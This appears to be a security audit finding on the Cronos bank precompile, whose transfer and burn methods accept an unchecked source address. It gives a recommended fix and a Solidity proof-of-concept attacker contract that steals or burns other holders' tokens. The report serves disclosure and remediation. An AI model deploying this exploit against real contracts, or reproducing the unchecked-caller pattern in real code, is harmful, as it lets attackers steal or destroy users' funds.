### Title
Bank Precompile `transfer` and `burn` Allow Unauthorized Movement of `evm/<contract>` Native Tokens From Any Holder - (File: `x/cronos/keeper/precompiles/bank.go`)

### Summary
The `BankContract` precompile (`0x0000000000000000000000000000000000000064`) exposes `transfer` and `burn` methods that accept an arbitrary source address as a caller-supplied argument without verifying it matches `contract.Caller()`. Any unprivileged EVM contract can call these methods to transfer or burn `evm/<callerContract>` native bank tokens from any account that holds them, without the holder's authorization.

### Finding Description
In `BankContract.Run()`, the `TransferMethodName` case decodes `sender` from `args[0]` and passes it directly as the `from` address to `bankKeeper.SendCoins`:

```go
sender := args[0].(common.Address)
...
from := sdk.AccAddress(sender.Bytes())
denom := EVMDenom(contract.Caller())
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

There is no check that `sender == contract.Caller()`. The denom is scoped to `evm/<contract.Caller()>`, but the source address is fully attacker-controlled.

The same flaw exists in the `BurnMethodName` case: `args[0]` is used as the address to burn from (`SendCoinsFromAccountToModule(ctx, addr, ...)`) without verifying it equals `contract.Caller()`.

The intended usage pattern, as shown in `TestBank.sol`, is for contracts to pass `msg.sender` as the source address. The precompile does not enforce this invariant.

### Impact Explanation
**Critical — Unauthorized transfer and burn of `evm/<contract>` native tokens.**

Any EVM contract can:
1. Call `bank.transfer(victimAddress, attackerAddress, amount)` — transfers `evm/<callerContract>` tokens from `victimAddress` to `attackerAddress` without `victimAddress`'s consent.
2. Call `bank.burn(victimAddress, amount)` — destroys `evm/<callerContract>` tokens held by `victimAddress` without consent.

Users who hold `evm/<contract>` tokens (e.g., deposited into a DeFi protocol that uses the bank precompile as its native token layer) can have their entire balance stolen or destroyed by the issuing contract at any time.

### Likelihood Explanation
Any unprivileged user can deploy a contract and exploit this. The attacker deploys a contract, attracts users to hold `evm/<attackerContract>` tokens (e.g., by offering yield, staking rewards, or any service that mints these tokens to users), then calls `bank.transfer` or `bank.burn` with victim addresses as the source. No privileged keys, governance access, or leaked secrets are required.

### Recommendation
In the `TransferMethodName` case, enforce that the `sender` argument equals `contract.Caller()`:
```go
if sender != contract.Caller() {
    return nil, errors.New("sender must be the calling contract")
}
```
In the `BurnMethodName` case, enforce that the burn-target address equals `contract.Caller()`:
```go
if recipient != contract.Caller() {
    return nil, errors.New("burn target must be the calling contract")
}
```
This ensures contracts can only move tokens from their own account, not from arbitrary holders.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address recipient, uint256 amount) external payable returns (bool);
    function burn(address from, uint256 amount) external payable returns (bool);
    function transfer(address sender, address recipient, uint256 amount) external payable returns (bool);
}

contract AttackerContract {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: Mint evm/AttackerContract tokens to victim as part of a "reward" scheme
    function mintToVictim(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: Steal victim's evm/AttackerContract tokens without any consent
    // sender arg is not validated against contract.Caller() in the precompile
    function stealFromVictim(address victim, address attacker, uint256 amount) external {
        bank.transfer(victim, attacker, amount);
    }

    // Alternative: destroy victim's tokens
    function burnVictimTokens(address victim, uint256 amount) external {
        bank.burn(victim, amount);
    }
}
```

The root cause is at lines 175–192 (`transfer`) and 121–150 (`burn`) of `x/cronos/keeper/precompiles/bank.go`, where `args[0]` is used as the source address without any check against `contract.Caller()`. [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** x/cronos/keeper/precompiles/bank.go (L56-58)
```go
func EVMDenom(token common.Address) string {
	return EVMDenomPrefix + token.Hex()
}
```

**File:** x/cronos/keeper/precompiles/bank.go (L113-155)
```go
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
```

**File:** x/cronos/keeper/precompiles/bank.go (L167-196)
```go
	case TransferMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
				return errorsmod.Wrap(err, "fail to send coins in precompiled contract")
			}
			return nil
		})
```
